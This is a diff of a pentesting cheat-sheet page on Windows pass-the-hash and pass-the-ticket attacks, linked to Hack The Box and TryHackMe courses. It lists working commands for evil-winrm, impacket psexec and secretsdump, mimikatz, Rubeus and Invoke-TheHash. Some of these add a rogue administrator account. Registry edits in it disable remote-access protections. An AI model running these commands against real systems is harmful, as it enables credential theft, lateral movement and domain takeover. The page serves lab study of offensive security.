@@ -378,27 +378,35 @@ PS> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$
 
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 [![attacking_common_services](../../_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
+[![active_directory_enumeration_attacks](../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
 [![attacktivedirectory](../../_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)
 
 There are some scenarios in which we got hold of a hash, but haven't managed to crack it. We may try to use the hash.
 
 Legacy systems using NTLM instead of Kerberos <small>(or alternatives)</small> may be vulnerable as hashes are not salted and may be reused.
 
+⚠️ When an administrator remotely access a host, the loose their privileges. If `FilterAdministratorToken` is disabled, setting to 1: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` will disable this security.
+
+⚠️ Remote RDP Pass-The-Hash is not possible by default. You need to disable `DisableRestrictedAdmin`. For instance, using the command: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` <small>(registry permission required)</small>.
+
 * Protocol-specific tools (examples)
 
 ```shell!
-$ evil-winrm -i IP -u username -H "hash" # WinRM protocol
-$ nxc smb IP/32 -u username -d . -H hash
-$ xfreerdp  /v:IP /u:username /pth:hash
-$ impacket-psexec -hashes :hash username@IP
-$ impacket-secretsdump -just-dc-user example/administrator username@IP -hashes xxx:yyy
+$ evil-winrm -i IP -u username -H "nthash" # WinRM protocol
+$ nxc smb IP/32 -u username -d . -H nthash
+$ xfreerdp  /v:IP /u:username /pth:nthash
+$ remmina # create a config and scroll down to "hash"
+$ impacket-psexec -hashes :nthash username@IP
+$ impacket-secretsdump -just-dc-user example/administrator username@IP -hashes lmhash:nthash
 ```
-
-⚠️ Remote Local Administrator pth is not possible by default. You need to disable DisableRestrictedAdmin, for instance, using: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` <small>(registry permission required)</small>.
 
 * We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool on Windows.
 
-* We can use [linikatz](https://github.com/CiscoCXSecurity/linikatz) <small>(0.5k ⭐)</small> on a Linux target
+```shell!
+mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:example.com
+mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:example.com /run:cmd.exe
+mimikatz# sekurlsa::pth /user:xxx /ntlm:XXX /domain:example.com /run:cmd.exe
+```
 
 * We can use the [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) <small>(1.4k ⭐, 2018 🪦)</small> script suite on Windows. We can use it to create a user on the target, if we have admin access onto the target. Otherwise, pop a reverse shell.
 
@@ -407,13 +415,12 @@ PS> Import-Module .\Invoke-TheHash.psd1
 PS> Invoke-SMBExec -Target IP -Domain xxx -Username xxx -Hash xxx -Command "net user xxx Password123 /add && net localgroup administrators xxx /add" -Verbose
 PS> Invoke-WMIExec -Target DC01 -Domain xxx.xxx -Username xxx -Hash xxx -Command "cmd.exe"
 ```
-
-⚠️ We cannot remotely access a local administrator account by default. If `FilterAdministratorToken` is disabled, you can set  `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` to 1 to bypass this check.
 </div><div>
 
 #### Pass-the-ticket (ptt)
 
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![active_directory_enumeration_attacks](../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
 
 Some authentication mechanisms such as [Kerberos](/operating-systems/cloud/active-directory/security/index.md#kerberos) are based on tickets to authorize access to resources. Given a ticket that hasn't expired, we may be able to access interesting resources.
 
@@ -422,33 +429,24 @@ On Windows, an user can only access their tickets, while an admin can access eve
 * We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool on Windows.
 
 ```shell!
-mimikatz# sekurlsa::tickets /export # dump tickets
-CMD> dir *.kirbi # @krbtgt == TGT
 mimikatz# kerberos::ptt ".\xxx@yyy.kirbi" # load ticket
 ```
-
-* We can use [linikatz](https://github.com/CiscoCXSecurity/linikatz) <small>(0.5k ⭐)</small> on Linux
-
-* We can use [mimipenguin](https://github.com/huntergregal/mimipenguin) <small>(3.7k ⭐, 2022 🪦)</small> on Linux
 
 * We can use [Rubeus](/cybersecurity/red-team/tools/utilities/creds/rubeus.md)
 
 ```shell!
-PS> .\Rubeus.exe dump /nowrap # Dump tickets
 PS> # Load the ticket in the current session
-PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /ptt
 PS> .\Rubeus.exe ptt /ticket:xxx@yyy.kirbi
 PS> .\Rubeus.exe ptt /ticket:<the base64 encoded ticket>
-PS> # Pass the Key / OverPass the Hash == create a ticket
-PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /aes256:xxx /nowrap
-PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /nowrap
 ```
+
+* On Linux, [refer to this](/operating-systems/cloud/active-directory/security/index.md#active-directory-on-linux) to load and use the ticket.
 
 **What's next? 🐼** According to the ticket that was loaded, you may be able to run commands that you couldn't before. For instance:
 
 ```shell!
-PS> dir \\DC01.xxx.yyy\c$
-PS> dir \\DC01.xxx.yyy\some_user_share
+PS> dir \\DC01.example.com\c$
+PS> dir \\DC01.example.com\some_user_share
 PS> dir \\DC01\some_user_share
 PS> Enter-PSSession -ComputerName DC01
 ```
